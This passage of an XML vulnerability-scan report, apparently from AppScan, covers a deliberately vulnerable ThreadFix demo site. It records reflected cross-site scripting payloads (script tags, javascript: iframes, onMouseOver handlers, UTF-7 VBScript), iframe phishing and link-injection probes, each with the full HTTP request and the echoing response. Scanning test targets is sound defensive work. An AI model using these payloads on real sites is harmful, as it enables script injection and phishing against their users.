          <Reasoning>The test successfully embedded a script in the response, and it will be executed once the page is loaded in the user's browser. This means the application is vulnerable to  Cross-Site Scripting.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="722" Length="12" String="alert(26990)" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/XSS-reflected2.php HTTP/1.0
Content-Length: 9
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XSS-reflected.php

username=
HTTP/1.1 200 OK
Content-Length: 229
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XSS2.php - Reflected
     This file accepts the payload from XSS.php. --&gt;
	 
&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XSS Test - Reflected&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Reflected XSS &lt;/h2&gt;

		Welcome !&lt;br /&gt;

	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/XSS-reflected2.php HTTP/1.0
Content-Length: 48
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XSS-reflected.php

username="&gt;&lt;/title&gt;&lt;script&gt;alert(26990)&lt;/script&gt;
HTTP/1.1 200 OK
Content-Length: 268
Date: Mon, 14 Jul 2014 14:48:39 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XSS2.php - Reflected
     This file accepts the payload from XSS.php. --&gt;
	 
&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XSS Test - Reflected&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Reflected XSS &lt;/h2&gt;

		Welcome "&gt;&lt;/title&gt;&lt;script&gt;alert(26990)&lt;/script&gt;!&lt;br /&gt;

	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
        <Variant ID="13284">
          <Comments />
          <Difference>parameter: cookie username= -&gt; username=%27%22%3E%3Ciframe+src%3Djavascript%3Aalert%2826992%29%3E</Difference>
          <Reasoning>The test successfully embedded a script in the response, and it will be executed once the page is loaded in the user's browser. This means the application is vulnerable to  Cross-Site Scripting.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="748" Length="12" String="alert(26992)" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/XSS-reflected2.php HTTP/1.0
Content-Length: 9
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XSS-reflected.php

username=
HTTP/1.1 200 OK
Content-Length: 229
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XSS2.php - Reflected
     This file accepts the payload from XSS.php. --&gt;
	 
&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XSS Test - Reflected&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Reflected XSS &lt;/h2&gt;

		Welcome !&lt;br /&gt;

	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/XSS-reflected2.php HTTP/1.0
Content-Length: 66
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XSS-reflected.php

username=%27%22%3E%3Ciframe+src%3Djavascript%3Aalert%2826992%29%3E
HTTP/1.1 200 OK
Content-Length: 268
Date: Mon, 14 Jul 2014 14:48:39 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XSS2.php - Reflected
     This file accepts the payload from XSS.php. --&gt;
	 
&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XSS Test - Reflected&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Reflected XSS &lt;/h2&gt;

		Welcome '"&gt;&lt;iframe src=javascript:alert(26992)&gt;!&lt;br /&gt;

	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
        <Variant ID="13286">
          <Comments />
          <Difference>parameter: cookie username= -&gt; username=%27%22%3E%3Cscript%3Ealert(26996)%3C%2Fscript%3E</Difference>
          <Reasoning>The test successfully embedded a script in the response, and it will be executed once the page is loaded in the user's browser. This means the application is vulnerable to  Cross-Site Scripting.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="724" Length="12" String="alert(26996)" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/XSS-reflected2.php HTTP/1.0
Content-Length: 9
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XSS-reflected.php

username=
HTTP/1.1 200 OK
Content-Length: 229
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XSS2.php - Reflected
     This file accepts the payload from XSS.php. --&gt;
	 
&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XSS Test - Reflected&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Reflected XSS &lt;/h2&gt;

		Welcome !&lt;br /&gt;

	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/XSS-reflected2.php HTTP/1.0
Content-Length: 57
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XSS-reflected.php

username=%27%22%3E%3Cscript%3Ealert(26996)%3C%2Fscript%3E
HTTP/1.1 200 OK
Content-Length: 261
Date: Mon, 14 Jul 2014 14:48:39 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XSS2.php - Reflected
     This file accepts the payload from XSS.php. --&gt;
	 
&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XSS Test - Reflected&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Reflected XSS &lt;/h2&gt;

		Welcome '"&gt;&lt;script&gt;alert(26996)&lt;/script&gt;!&lt;br /&gt;

	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
        <Variant ID="13288">
          <Comments />
          <Difference>parameter: cookie username= -&gt; username=&lt;/TextArea&gt;&lt;script&gt;alert(27000)&lt;/script&gt;</Difference>
          <Reasoning>The test successfully embedded a script in the response, and it will be executed once the page is loaded in the user's browser. This means the application is vulnerable to  Cross-Site Scripting.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="724" Length="12" String="alert(27000)" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/XSS-reflected2.php HTTP/1.0
Content-Length: 9
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XSS-reflected.php

username=
HTTP/1.1 200 OK
Content-Length: 229
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XSS2.php - Reflected
     This file accepts the payload from XSS.php. --&gt;
	 
&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XSS Test - Reflected&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Reflected XSS &lt;/h2&gt;

		Welcome !&lt;br /&gt;

	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/XSS-reflected2.php HTTP/1.0
Content-Length: 49
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XSS-reflected.php

username=&lt;/TextArea&gt;&lt;script&gt;alert(27000)&lt;/script&gt;
HTTP/1.1 200 OK
Content-Length: 269
Date: Mon, 14 Jul 2014 14:48:39 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XSS2.php - Reflected
     This file accepts the payload from XSS.php. --&gt;
	 
&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XSS Test - Reflected&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Reflected XSS &lt;/h2&gt;

		Welcome &lt;/TextArea&gt;&lt;script&gt;alert(27000)&lt;/script&gt;!&lt;br /&gt;

	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
        <Variant ID="13290">
          <Comments />
          <Difference>parameter: cookie username= -&gt; username=%3E%2BACJ-%2BAD4APB-SCRIPT%2FTYPE%3DTEXT%2FVBSCRIPT%2BAD7-MSGBOX%28123%29%2BAA0APB-%2FSCRIPT%2BAD7-</Difference>
          <Reasoning>The test successfully embedded a script in the response, and it will be executed once the page is loaded in the user's browser. This means the application is vulnerable to  Cross-Site Scripting.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="765" Length="75" String="&gt;+ACJ-+AD4APB-SCRIPT/TYPE=TEXT/VBSCRIPT+AD7-MSGBOX(123)+AA0APB-/SCRIPT+AD7-" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/XSS-reflected2.php HTTP/1.0
Content-Length: 9
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XSS-reflected.php

username=
HTTP/1.1 200 OK
Content-Length: 229
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XSS2.php - Reflected
     This file accepts the payload from XSS.php. --&gt;
	 
&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XSS Test - Reflected&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Reflected XSS &lt;/h2&gt;

		Welcome !&lt;br /&gt;

	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/XSS-reflected2.php HTTP/1.0
Content-Length: 108
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XSS-reflected.php

username=%3E%2BACJ-%2BAD4APB-SCRIPT%2FTYPE%3DTEXT%2FVBSCRIPT%2BAD7-MSGBOX%28123%29%2BAA0APB-%2FSCRIPT%2BAD7-
HTTP/1.1 200 OK
Content-Length: 304
Date: Mon, 14 Jul 2014 14:48:39 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XSS2.php - Reflected
     This file accepts the payload from XSS.php. --&gt;
	 
&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XSS Test - Reflected&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Reflected XSS &lt;/h2&gt;

		Welcome &gt;+ACJ-+AD4APB-SCRIPT/TYPE=TEXT/VBSCRIPT+AD7-MSGBOX(123)+AA0APB-/SCRIPT+AD7-!&lt;br /&gt;

	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
        <Variant ID="13294">
          <Comments />
          <Difference>parameter: cookie username= -&gt; username=%27%22&gt;&lt;A%20HREF=Link%20onMouseOver=alert(27012)&gt;HoverMe&lt;/A&gt;</Difference>
          <Reasoning>The test successfully embedded a script in the response, which will be executed once the user activates the OnMouseOver function (i.e., hovers with the mouse cursor over the vulnerable control). This means that the application is vulnerable to Cross-Site Scripting attacks.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="728" Length="38" String="&lt;A HREF=Link onMouseOver=alert(27012)&gt;" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/XSS-reflected2.php HTTP/1.0
Content-Length: 9
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XSS-reflected.php

username=
HTTP/1.1 200 OK
Content-Length: 229
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XSS2.php - Reflected
     This file accepts the payload from XSS.php. --&gt;
	 
&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XSS Test - Reflected&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Reflected XSS &lt;/h2&gt;

		Welcome !&lt;br /&gt;

	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/XSS-reflected2.php HTTP/1.0
Content-Length: 69
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XSS-reflected.php

username=%27%22&gt;&lt;A%20HREF=Link%20onMouseOver=alert(27012)&gt;HoverMe&lt;/A&gt;
HTTP/1.1 200 OK
Content-Length: 281
Date: Mon, 14 Jul 2014 14:48:39 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XSS2.php - Reflected
     This file accepts the payload from XSS.php. --&gt;
	 
&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XSS Test - Reflected&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Reflected XSS &lt;/h2&gt;

		Welcome '"&gt;&lt;A HREF=Link onMouseOver=alert(27012)&gt;HoverMe&lt;/A&gt;!&lt;br /&gt;

	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
        <Variant ID="13301">
          <Comments />
          <Difference>parameter: cookie username= -&gt; username=*/--&gt;&lt;/script&gt;&lt;script&gt;alert(27026)&lt;/script&gt;</Difference>
          <Reasoning>The test successfully embedded a script in the response, and it will be executed once the page is loaded in the user's browser. This means the application is vulnerable to  Cross-Site Scripting.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="730" Length="12" String="alert(27026)" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/XSS-reflected2.php HTTP/1.0
Content-Length: 9
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XSS-reflected.php

username=
HTTP/1.1 200 OK
Content-Length: 229
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XSS2.php - Reflected
     This file accepts the payload from XSS.php. --&gt;
	 
&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XSS Test - Reflected&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Reflected XSS &lt;/h2&gt;

		Welcome !&lt;br /&gt;

	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/XSS-reflected2.php HTTP/1.0
Content-Length: 52
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XSS-reflected.php

username=*/--&gt;&lt;/script&gt;&lt;script&gt;alert(27026)&lt;/script&gt;
HTTP/1.1 200 OK
Content-Length: 272
Date: Mon, 14 Jul 2014 14:48:39 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XSS2.php - Reflected
     This file accepts the payload from XSS.php. --&gt;
	 
&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XSS Test - Reflected&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Reflected XSS &lt;/h2&gt;

		Welcome */--&gt;&lt;/script&gt;&lt;script&gt;alert(27026)&lt;/script&gt;!&lt;br /&gt;

	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
      </Issue>
      <Issue IssueTypeID="phishingInFrames" Noise="False">
        <Url>http://tftarget/demo/XSS-reflected2.php</Url>
        <Entity Name="username" Type="Parameter" />
        <Variant ID="13326">
          <Comments />
          <Difference>parameter: cookie username= -&gt; username=%27%22%3E%3Ciframe+src%3Dhttp%3A%2F%2Fdemo.testfire.net%3E</Difference>
          <Reasoning>The test response contained a link to the URL "http://demo.testfire.net, which proves that the Phishing attempt was successful.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="738" Length="24" String="http://demo.testfire.net" />
            <Validation Location="745" Length="17" String="demo.testfire.net" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/XSS-reflected2.php HTTP/1.0
Content-Length: 9
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XSS-reflected.php

username=
HTTP/1.1 200 OK
Content-Length: 229
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XSS2.php - Reflected
     This file accepts the payload from XSS.php. --&gt;
	 
&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XSS Test - Reflected&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Reflected XSS &lt;/h2&gt;

		Welcome !&lt;br /&gt;

	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/XSS-reflected2.php HTTP/1.0
Content-Length: 67
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XSS-reflected.php

username=%27%22%3E%3Ciframe+src%3Dhttp%3A%2F%2Fdemo.testfire.net%3E
HTTP/1.1 200 OK
Content-Length: 269
Date: Mon, 14 Jul 2014 14:48:40 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XSS2.php - Reflected
     This file accepts the payload from XSS.php. --&gt;
	 
&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XSS Test - Reflected&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Reflected XSS &lt;/h2&gt;

		Welcome '"&gt;&lt;iframe src=http://demo.testfire.net&gt;!&lt;br /&gt;

	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
      </Issue>
      <Issue IssueTypeID="attLinkInjection" Noise="False">
        <Url>http://tftarget/demo/XSS-reflected2.php</Url>
        <Entity Name="username" Type="Parameter" />
        <Variant ID="13336">
          <Comments />
          <Difference>parameter: cookie username= -&gt; username=%22%27%3E%3CIMG+SRC%3D%22%2FWF_XSRF.html%22%3E</Difference>
          <Reasoning>The test response contained a link to the file "WF_XSRF.html, which proves that the Cross-Site Request Forgery attempt was successful.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="724" Length="13" String="/WF_XSRF.html" />
            <Validation Location="725" Length="12" String="WF_XSRF.html" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/XSS-reflected2.php HTTP/1.0
Content-Length: 9
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XSS-reflected.php

username=
HTTP/1.1 200 OK
Content-Length: 229
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XSS2.php - Reflected
     This file accepts the payload from XSS.php. --&gt;
	 
&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XSS Test - Reflected&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Reflected XSS &lt;/h2&gt;

		Welcome !&lt;br /&gt;

	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/XSS-reflected2.php HTTP/1.0
Content-Length: 55
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XSS-reflected.php

username=%22%27%3E%3CIMG+SRC%3D%22%2FWF_XSRF.html%22%3E
HTTP/1.1 200 OK
Content-Length: 257
Date: Mon, 14 Jul 2014 14:48:40 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XSS2.php - Reflected
     This file accepts the payload from XSS.php. --&gt;
	 
&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XSS Test - Reflected&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Reflected XSS &lt;/h2&gt;

		Welcome "'&gt;&lt;IMG SRC="/WF_XSRF.html"&gt;!&lt;br /&gt;

	&lt;/body&gt;
&lt;/html&gt;


GET /WF_XSRF.html HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Referer: http://tftarget/demo/XSS-reflected2.php


HTTP/1.1 404 Not Found
Content-Length: 210
Date: Mon, 14 Jul 2014 14:48:40 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
Connection: close
Content-Type: text/html; charset=iso-8859-1

&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;
&lt;html&gt;&lt;head&gt;
&lt;title&gt;404 Not Found&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Not Found&lt;/h1&gt;
&lt;p&gt;The requested URL /WF_XSRF.html was not found on this server.&lt;/p&gt;
&lt;/body&gt;&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
      </Issue>
      <Issue IssueTypeID="attSensitiveInHtmlComments" Noise="False">
        <Url>http://tftarget/demo/</Url>
        <Entity />
        <Variant ID="13343">
          <Comments />
          <Difference>No test request</Difference>
          <Reasoning>AppScan discovered HTML comments containing what appears to be sensitive information.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="478" Length="8" String="database" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>GET /demo/ HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget


HTTP/1.1 200 OK
Content-Length: 900
Date: Mon, 14 Jul 2014 14:44:46 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
Last-Modified: Thu, 09 Jun 2011 14:24:57 GMT
ETag: "2000000023431-384-4a54837b0b761"
Accept-Ranges: bytes
Connection: close
Content-Type: text/html

&lt;!-- XSS TEST - STORED --&gt;
&lt;!-- The goal is to pull the payload from the database. After that we'll see. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;Threadfix Vulnerability Demos&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Demo List &lt;/h2&gt;
	&lt;ol&gt;
		&lt;li&gt;&lt;a href="XSS.php"&gt;XSS&lt;/a&gt;&lt;br/&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="SQLI.php"&gt;SQL Injection&lt;/a&gt;&lt;br/&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="PredictableResource.php"&gt;Predictable Resource Location&lt;/a&gt;&lt;br/&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="PathTraversal.php?action=PathTraversal.php"&gt;Path Traversal&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="DirectoryIndexing/"&gt;Directory Indexing&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="XPathInjection.php"&gt;XPath Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="LDAPInjection.php"&gt;LDAP Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="FormatString.php"&gt;Format String Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="OSCommandInjection.php"&gt;OS Command Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="EvalInjection.php"&gt;Eval Injection&lt;/a&gt;&lt;/li&gt;
	&lt;/ol&gt;
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>GET /demo/ HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget


HTTP/1.1 200 OK
Content-Length: 900
Date: Mon, 14 Jul 2014 14:44:46 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
Last-Modified: Thu, 09 Jun 2011 14:24:57 GMT
ETag: "2000000023431-384-4a54837b0b761"
Accept-Ranges: bytes
Connection: close
Content-Type: text/html

&lt;!-- XSS TEST - STORED --&gt;
&lt;!-- The goal is to pull the payload from the database. After that we'll see. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;Threadfix Vulnerability Demos&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Demo List &lt;/h2&gt;
	&lt;ol&gt;
		&lt;li&gt;&lt;a href="XSS.php"&gt;XSS&lt;/a&gt;&lt;br/&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="SQLI.php"&gt;SQL Injection&lt;/a&gt;&lt;br/&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="PredictableResource.php"&gt;Predictable Resource Location&lt;/a&gt;&lt;br/&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="PathTraversal.php?action=PathTraversal.php"&gt;Path Traversal&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="DirectoryIndexing/"&gt;Directory Indexing&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="XPathInjection.php"&gt;XPath Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="LDAPInjection.php"&gt;LDAP Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="FormatString.php"&gt;Format String Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="OSCommandInjection.php"&gt;OS Command Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="EvalInjection.php"&gt;Eval Injection&lt;/a&gt;&lt;/li&gt;
	&lt;/ol&gt;
	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
      </Issue>
      <Issue IssueTypeID="attSensitiveInHtmlComments" Noise="False">
        <Url>http://tftarget/demo/SQLI.php</Url>
        <Entity />
        <Variant ID="13344">
          <Comments />
          <Difference>No test request</Difference>
          <Reasoning>AppScan discovered HTML comments containing what appears to be sensitive information.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="366" Length="3" String="SQL" />
            <Validation Location="440" Length="8" String="password" />
            <Validation Location="465" Length="3" String="SQL" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>GET /demo/SQLI.php HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Referer: http://tftarget/demo/


HTTP/1.1 200 OK
Content-Length: 608
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!--
SQL Injection test page
This page's intended use is to show unauthorized password retrieval using SQL Injection.
This is the submission form.
--&gt;

&lt;html&gt;
	&lt;head&gt;
